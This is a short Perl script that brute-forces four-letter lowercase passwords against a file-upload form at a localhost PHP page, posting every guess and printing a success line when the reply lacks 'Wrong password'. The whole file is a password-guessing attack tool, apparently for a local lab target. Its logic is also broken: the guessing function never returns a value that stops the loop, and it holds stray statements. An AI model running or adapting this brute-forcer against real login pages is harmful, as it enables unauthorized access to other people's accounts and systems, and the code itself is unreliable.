#!/usr/bin/perl
use LWP;

# Create a user agent object
my $browser = LWP::UserAgent->new;

@str=qw/ a b c d e f g h i j k l m n o p q r s t u v w x y z/;
 createPass();   


sub createPass{
$num4=0;
foreach my $i4 ($str[0]..$str[-1]) {
	$num3=0;
	foreach my $i3 ($str[0]..$str[-1]) {
		$num2=0;
		foreach my $i2 ($str[0]..$str[-1]) {
			$num1=0;
			foreach my $i ($str[0]..$str[-1]) {
			$pass=$str[$num4].$str[$num3].$str[$num2].$str[$num1];
			if(sendPassword($pass)==1){
					return true;}
				    else{
					 print ;
					 print $pass." : NO\n";}
			$num1++; 
		}
		$num2++; 
		}
	$num3++; 
	}
$num4++; 
}

}

sub sendPassword{  
 my ($password) = @_;
print $item;
 $response =  $browser->post( 'http://localhost/up1file.php',
    [ 'action' =>'do_upload',
      'password' => $password,
    ]
  )->as_string;
  
 if ( $response  !~ m/Wrong password/) {
    print "Successful with password '$password'\n";
 }
}